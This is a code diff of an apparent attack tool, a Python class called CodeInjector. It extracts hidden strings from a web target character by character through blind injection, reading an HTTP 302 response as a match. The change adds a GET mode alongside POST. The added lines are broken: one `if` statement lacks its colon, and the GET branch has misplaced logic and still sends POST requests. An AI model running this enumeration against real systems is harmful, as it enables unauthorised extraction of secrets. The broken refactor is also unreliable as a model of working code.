@@ -107,30 +107,36 @@ class CodeInjector:
         else:
             ml = []
             m = ''
-            if self.r == 'POST':
-                for c in string.printable:
-                    if c in badchar:
-                        continue
-                    payload = self.build_payload(char=c)
+
+            for c in string.printable:
+                if c in badchar:
+                    continue
+                payload = self.build_payload(char=c)
+                if self.r == 'POST'
                     query = post(self.h, data=payload, allow_redirects=False, verify=False)
                     if query.status_code == 302:
                         stdout.write(f'[+] Starting character "{c}"\n'
                                       '[+] Enumerating rest of string...\n')
-                        m += c
-                        while True:
-                            for cc in string.printable:
-                                if cc in badchar:
-                                    continue
-                                payload = self.build_payload(char=(m + cc))
-                                query = post(self.h, data=payload, allow_redirects=False, verify=False)
-                                if query.status_code == 302:
-                                    stdout.write(f'[+] Match: "{cc}"\n')
-                                    m += cc
-                                    break
-                            if query.status_code != 302:
-                                ml.append(m)
-                                m = ''
+                elif self.r == 'GET':
+                    query = get(self.h, data=payload, allow_redirects=False, verify=False)
+                    if query.status_code == 302:
+                        stdout.write(f'[+] Starting character "{c}"\n'
+                                      '[+] Enumerating rest of string...\n')
+                    m += c
+                    while True:
+                        for cc in string.printable:
+                            if cc in badchar:
+                                continue
+                            payload = self.build_payload(char=(m + cc))
+                            query = post(self.h, data=payload, allow_redirects=False, verify=False)
+                            if query.status_code == 302:
+                                stdout.write(f'[+] Match: "{cc}"\n')
+                                m += cc
                                 break
+                        if query.status_code != 302:
+                            ml.append(m)
+                            m = ''
+                            break
 
             stdout.write('[+] Results:\n'
                         f'[+] Matches for {self.tg}:\n')
